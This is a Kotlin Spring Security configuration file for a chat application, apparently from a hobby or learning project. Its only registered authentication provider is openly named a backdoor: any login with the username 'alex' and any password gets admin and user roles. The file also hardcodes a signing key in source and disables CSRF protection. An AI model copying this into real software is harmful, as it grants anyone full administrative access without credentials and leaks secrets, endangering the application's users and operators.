package moe.itsusinn.mychat.configuration

import moe.itsusinn.mychat.services.MyUserDetailsService
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.http.HttpMethod
import org.springframework.security.authentication.AuthenticationProvider
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder
import org.springframework.security.config.annotation.web.builders.HttpSecurity
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter
import org.springframework.security.config.http.SessionCreationPolicy
import org.springframework.security.core.Authentication
import org.springframework.security.core.AuthenticationException
import org.springframework.security.core.GrantedAuthority
import org.springframework.security.core.authority.SimpleGrantedAuthority
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder
import org.springframework.stereotype.Component
import java.util.*


object SecurityConst {
    const val SignUpUrl = "/user/signup"
    const val Key =
        "&E)H@McQfTjWnZr4u7x!z%C*F-JaNdRgUkXp2s5v8y/B?D(G+KbPeShVmYq3t6w9z\$C&F)H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkXp2s5v8y/B?E(H+MbQeShVmYq3t"
    const val HeaderName = "Authorization"
    const val ExpirationTime = 1000_60_30
}

@EnableWebSecurity
class SecurityConfiguration : WebSecurityConfigurerAdapter() {

    @Autowired
    lateinit var userDetailsService: MyUserDetailsService

    @Autowired
    lateinit var bCryptPasswordEncoder: BCryptPasswordEncoder

    @Autowired
    lateinit var backdoorAuthenticationProvider: BackdoorAuthenticationProvider

    override fun configure(auth: AuthenticationManagerBuilder) {
        auth.authenticationProvider(backdoorAuthenticationProvider)
    }

    //configure all the requests' rule
    override fun configure(httpSecurity: HttpSecurity) {
        httpSecurity.cors().and().csrf().disable()
            .authorizeRequests()
            .antMatchers(HttpMethod.POST, SecurityConst.SignUpUrl).permitAll()
            .anyRequest().authenticated()
            .and()
            .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)

    }

}

@Component
class BackdoorAuthenticationProvider : AuthenticationProvider {
    @Throws(AuthenticationException::class)
    override fun authenticate(authentication: Authentication): Authentication? {
        val name: String = authentication.name
        val password: String = authentication.credentials.toString()

        //利用alex用户名登录，不管密码是什么都可以，伪装成admin用户
        return if (name == "alex") {
            val authorityCollection: MutableCollection<GrantedAuthority> = ArrayList()
            authorityCollection.add(SimpleGrantedAuthority("ROLE_ADMIN"))
            authorityCollection.add(SimpleGrantedAuthority("ROLE_USER"))
            UsernamePasswordAuthenticationToken(
                "admin", password, authorityCollection
            )
        } else null
    }

    override fun supports(authentication: Class<*>): Boolean {
        return authentication ==
                UsernamePasswordAuthenticationToken::class.java
    }
}